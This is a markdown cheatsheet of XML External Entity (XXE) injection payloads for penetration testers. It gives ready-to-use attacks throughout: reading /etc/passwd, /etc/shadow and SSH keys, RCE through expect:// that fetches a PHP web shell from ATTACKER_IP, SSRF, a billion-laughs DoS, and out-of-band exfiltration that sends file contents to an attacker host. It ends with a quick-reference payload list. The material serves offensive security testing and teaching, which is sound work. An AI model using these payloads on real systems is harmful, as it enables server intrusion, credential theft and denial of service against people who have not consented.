# XXE Injection Cheatsheet

---

## Table of Contents

- [1. Concepts](#1-concepts)
  - [1.1 XML Basics](#11-xml-basics)
  - [1.2 XML DTD](#12-xml-dtd)
  - [1.3 XML Entities](#13-xml-entities)
  - [1.4 Custom Entities](#14-custom-entities)
  - [1.5 External Entities](#15-external-entities)
- [2. Discovery & Identification](#2-discovery--identification)
  - [2.1 Finding XXE Entry Points](#21-finding-xxe-entry-points)
  - [2.2 Testing for Vulnerability](#22-testing-for-vulnerability)
  - [2.3 XML Special Character Entities](#23-xml-special-character-entities)
- [3. Local File Disclosure](#3-local-file-disclosure)
  - [3.1 Reading Sensitive Files](#31-reading-sensitive-files)
  - [3.2 Reading Source Code (PHP base64 wrapper)](#32-reading-source-code-php-base64-wrapper)
  - [3.3 Remote Code Execution (RCE)](#33-remote-code-execution-rce)
  - [3.4 SSRF via XXE](#34-ssrf-via-xxe)
  - [3.5 DoS (Billion Laughs / XML Bomb)](#35-dos-billion-laughs--xml-bomb)
- [4. Advanced File Disclosure](#4-advanced-file-disclosure)
  - [4.1 CDATA Exfiltration (External DTD Method)](#41-cdata-exfiltration-external-dtd-method)
  - [4.2 CDATA Limitations](#42-cdata-limitations)
  - [4.3 Error-Based XXE](#43-error-based-xxe)
  - [4.4 Other Error-Triggering Methods](#44-other-error-triggering-methods)
- [5. Blind XXE / OOB Exfiltration](#5-blind-xxe--oob-exfiltration)
  - [5.1 Detecting Blind XXE (OOB Ping)](#51-detecting-blind-xxe-oob-ping)
  - [5.2 OOB via XML Parameter Entities](#52-oob-via-xml-parameter-entities)
  - [5.3 OOB Data Exfiltration](#53-oob-data-exfiltration)
  - [5.4 Automated OOB Exfiltration](#54-automated-oob-exfiltration)
  - [5.5 Repurposing a Local DTD (Blind)](#55-repurposing-a-local-dtd-blind)
- [6. Hidden Attack Surface](#6-hidden-attack-surface)
  - [6.1 XInclude Attacks](#61-xinclude-attacks)
  - [6.2 XXE via File Upload](#62-xxe-via-file-upload)
  - [6.3 XXE via Modified Content-Type](#63-xxe-via-modified-content-type)
- [7. Quick Reference — Payloads](#7-quick-reference--payloads)

---

## 1. Concepts

### 1.1 XML Basics

XML (Extensible Markup Language) stores/structures data using a tree of tagged elements. Key components:

| Term | Description | Example |
|------|-------------|---------|
| **Tag** | Key wrapped in `< />` | `<date>` |
| **Entity** | XML variable wrapped in `& ;` | `&lt;` |
| **Element** | Tag + its value | `<date>01-01-2022</date>` |
| **Attribute** | Optional spec inside a tag | `version="1.0"` |
| **Declaration** | First line, defines version/encoding | `<?xml version="1.0" encoding="UTF-8"?>` |

---

### 1.2 XML DTD

Document Type Definition — defines the structure of an XML document.

**Internal DTD:**
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT date (#PCDATA)>
]>
```

**External DTD file:**
```xml
<!DOCTYPE email SYSTEM "email.dtd">
```

**External DTD via URL:**
```xml
<!DOCTYPE email SYSTEM "http://example.com/email.dtd">
```

---

### 1.3 XML Entities

Built-in character entities to escape XML-reserved characters:

| Character | Entity |
|-----------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `'` | `&apos;` |
| `"` | `&quot;` |

---

### 1.4 Custom Entities

Defined with `ENTITY` keyword inside a DTD:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
...
<name>&company;</name>  <!-- renders as "Inlane Freight" -->
```

---

### 1.5 External Entities

Entities whose value is loaded from a file or URL using the `SYSTEM` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

> `PUBLIC` can be used instead of `SYSTEM` for publicly declared entities/standards.

**Why this matters for attacks:** When the XML is parsed server-side (SOAP APIs, web forms), the entity can reference local files and expose them in the response.

---

## 2. Discovery & Identification

### 2.1 Finding XXE Entry Points

Look for endpoints that accept XML input:
- Web forms transmitting data in XML format
- SOAP/XML APIs
- File upload functionality (SVG, DOCX, XLSX, PDF, etc.)
- Endpoints with `Content-Type: application/xml` or `text/xml`

> **Tip:** Even if an app uses JSON, try switching `Content-Type: application/xml` and converting the body to XML. Some apps silently accept both.

---

### 2.2 Testing for Vulnerability

**Step 1** — Define a harmless custom entity and reference it in a reflected field:

```xml
<!DOCTYPE email [
  <!ENTITY test "HelloXXE">
]>
...
<email>&test;</email>
```

If the response shows `HelloXXE` instead of `&test;` literally → **parser is resolving entities → vulnerable**.

**Step 2** — Escalate to an external entity (file read):

```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
...
<email>&xxe;</email>
```

---

### 2.3 XML Special Character Entities

Always try predefined entities first when injecting into XML fields:

| Character | Entity |
|-----------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `'` | `&apos;` |
| `"` | `&quot;` |

---

## 3. Local File Disclosure

### 3.1 Reading Sensitive Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <email>&xxe;</email>
</root>
```

**Common targets:**

| OS | Path |
|----|------|
| Linux | `file:///etc/passwd` |
| Linux | `file:///etc/shadow` |
| Linux | `file:///home/user/.ssh/id_rsa` |
| Windows | `file:///c:/windows/win.ini` |
| Windows | `file:///c:/boot.ini` |

> **Note:** On Java web apps, specifying a directory path instead of a file may return a directory listing.

---

### 3.2 Reading Source Code (PHP base64 wrapper)

Direct file reads break on files containing XML special characters (`<`, `>`, `&`). Use PHP's filter wrapper to base64-encode first:

```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
...
<email>&xxe;</email>
```

Decode the base64 output to read the source code.

> ⚠️ **PHP only.** Does not work on Java, .NET, or other backends.

---

### 3.3 Remote Code Execution (RCE)

Requires the PHP `expect` module (rarely enabled by default).

**1. Host a web shell:**
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

**2. Use `expect://` with `$IFS` to avoid spaces breaking XML:**
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'ATTACKER_IP/shell.php'">
]>
<root>
  <email>&xxe;</email>
</root>
```

> ⚠️ Avoid `|`, `>`, `{` — they break XML syntax. Use `$IFS` in place of spaces.
> ⚠️ `expect` is not enabled on modern PHP servers — this rarely works.

---

### 3.4 SSRF via XXE

Force the server to make an internal HTTP request:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.target.com/">
]>
<root>
  <data>&xxe;</data>
</root>
```

**Two-way SSRF** (if output is reflected): iterate URL paths to enumerate the internal API.

**Blind SSRF** (if output is not reflected): monitor an out-of-band server for callbacks.

---

### 3.5 DoS (Billion Laughs / XML Bomb)

Exponential entity expansion exhausts server memory:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root><email>&a10;</email></root>
```

> ⚠️ Modern web servers (e.g. Apache) protect against self-reference loops — this is largely patched.

---

## 4. Advanced File Disclosure

### 4.1 CDATA Exfiltration (External DTD Method)

CDATA wraps file content as raw character data, bypassing XML special character parsing issues.

**Why the naive inline approach fails:**
- XML internal DTD subset does not allow entity values composed from other entity references.
- Parameter entities (`%name;`) cannot be used inside entity value declarations in the internal DTD.

**Working approach — use an external DTD for composition:**

**Step 1 — Create and host `xxe.dtd`:**
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

**Step 2 — Send the payload:**
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email>
```

**How it works:**
1. `%begin`, `%file`, `%end` are declared as parameter entities.
2. `%xxe` loads your external DTD, where composition is permitted.
3. `xxe.dtd` defines `&joined;` by concatenating all three — wrapping file content in CDATA.
4. `&joined;` in the document body outputs the file safely.

To read a different file, only change `%file`:
```xml
<!ENTITY % file SYSTEM "file:///var/www/html/config.php">
```

---

### 4.2 CDATA Limitations

| Scenario | Works? |
|----------|--------|
| PHP/HTML source files | ✅ Yes |
| Config files with `=`, `:`, spaces | ✅ Yes |
| Files containing `&` or `<` | ✅ Yes (CDATA handles these) |
| Files containing `%` | ❌ No — DTD parse error |
| Files containing `]]>` | ❌ No — terminates CDATA early |
| Binary / non-Unicode files | ❌ No — use `php://filter` base64 instead |

---

### 4.3 Error-Based XXE

When the app doesn't reflect XML output but does show runtime errors (PHP errors, Java stack traces), errors can be weaponized to leak file contents.

**Step 1 — Confirm error disclosure:**
Send malformed XML to trigger a parser error:
- Delete a closing tag
- Use `<roo>` instead of `<root>`
- Reference a non-existing entity: `&nonexistent;`

If you see a stack trace or file path leak → error-based XXE is possible.

**Step 2 — Host the malicious DTD:**
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

> `&#x25;` = `%` (hex entity encoding required for nested `%` inside a DTD declaration)

**Step 3 — Trigger it from the request:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %xxe;
]>
<root><email>test</email></root>
```

The parser will error out trying to load `file:///nonexistent/<contents of /etc/passwd>` and display the file content inside the error message.

---

### 4.4 Other Error-Triggering Methods

- Delete closing tag from document
- Malform element names (`<roo>` vs `<root>`)
- Reference undefined entity (`&undefined;`)
- Break XML structure intentionally

Any error message containing a file path or server info is also useful for recon.

---

## 5. Blind XXE / OOB Exfiltration

### 5.1 Detecting Blind XXE (OOB Ping)

No output reflected — verify via out-of-band callback using Burp Collaborator or a self-hosted listener:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR_URL">
]>
<root><email>&xxe;</email></root>
```

If you see a DNS/HTTP hit on your listener → blind XXE confirmed.

---

### 5.2 OOB via XML Parameter Entities

In cases where regular entities are blocked, parameter entities (prefixed with `%`) can still trigger OOB:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR_URL">
  %xxe;
]>
```

---

### 5.3 OOB Data Exfiltration

Exfiltrate file content via DNS/HTTP using a two-stage DTD:

**Host `exfil.dtd` on your server:**
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP/?x=%file;'>">
%eval;
%exfil;
```

**Request payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/exfil.dtd">
  %xxe;
]>
<root><data>test</data></root>
```

The file contents will be URL-encoded and sent to your server as a query parameter.

> ⚠️ Multi-line files may fail — works best for single-line values (hostnames, tokens, passwords).

---

### 5.4 Automated OOB Exfiltration

Tools:
- **XXEinjector** — automated exploitation via direct and OOB methods
- **Burp Collaborator** — built-in OOB detection in Burp Suite Pro
- **xxe.sh** — OOB server for FTP/HTTP exfiltration and payload generation

---

### 5.5 Repurposing a Local DTD (Blind)

When external DTD loading is blocked (no outbound HTTP), use a DTD already present on the server to redefine an existing parameter entity.

**Find local DTDs:**
```bash
locate .dtd
```

**Common Linux paths:**
```
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```

**Example — exploiting `/usr/share/xml/fontconfig/fonts.dtd`** (which has an injectable `%constant` entity):
```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<message>Text</message>
```

---

## 6. Hidden Attack Surface

### 6.1 XInclude Attacks

When you can't control the DOCTYPE (e.g. your input is embedded into a server-side XML document), use XInclude — it works without a DOCTYPE:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Inject this directly into any XML field value that is reflected in a server-side XML document.

---

### 6.2 XXE via File Upload

File formats that contain XML can be weaponized:

| Format | Notes |
|--------|-------|
| SVG | XML-based image format — widely accepted |
| DOCX / XLSX / PPTX | ZIP archives containing XML — inject into internal XML files |
| ODT / ODS / ODP | Same ZIP/XML structure as Office formats |
| PDF | Can contain XML metadata |

**SVG example:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

Upload as an SVG image and check if the contents appear in the response or in how the image is rendered.

Tools:
- **oxml_xxe** — embeds XXE into DOCX/XLSX/PPTX/ODT/SVG/PDF
- **docem** — embeds XXE/XSS into docx, odt, pptx, etc.

---

### 6.3 XXE via Modified Content-Type

When an app normally uses JSON, try switching to XML:

**Original request:**
```
Content-Type: application/json
{"email":"test@test.com"}
```

**Modified request:**
```
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><email>&xxe;</email></root>
```

If the app processes XML silently, it may expose an XXE vulnerability not visible through normal testing.

---

## 7. Quick Reference — Payloads

```xml
<!-- Basic file read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

<!-- PHP base64 source read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<root><data>&xxe;</data></root>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.target/secret">]>
<root><data>&xxe;</data></root>

<!-- Blind OOB ping -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP/">]>
<root><data>&xxe;</data></root>

<!-- Blind OOB via parameter entity -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP/">%xxe;]>

<!-- XInclude (no DOCTYPE needed) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- SVG file upload -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>

<!-- Error-based (host DTD externally) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP/error.dtd">%xxe;]>

<!-- CDATA exfiltration (host xxe.dtd externally) -->
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/xxe.dtd">
  %xxe;
]>
<root><email>&joined;</email></root>
```

---

*Happy hacking — authorized targets only.*
